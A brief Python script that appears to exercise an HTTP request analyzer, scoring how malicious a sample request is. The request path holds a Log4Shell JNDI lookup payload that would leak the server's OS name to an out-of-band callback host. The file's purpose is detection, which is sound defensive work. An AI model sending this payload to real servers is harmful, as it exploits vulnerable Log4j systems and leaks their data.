import httpanalyzer


instance = httpanalyzer.Request(
    {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
     'accept-encoding': 'gzip, deflate, br',
     'accept-language': 'en-US,en;q=0.5',
     'connection': 'keep-alive',
     'host': '127.0.0.1:80',
     'user-agent': 'curl/7.82.0'},
    '159.223.205.51',
    '/api/geojson?url=${jndi:ldap://${sys:os.name}.cd387hid68000106u4rtc.oast.me}',
    ['wp-content', 'wp-config', 'wp-includes']
)
print(f"Malicious rating: {instance.malicious() * 100}%")
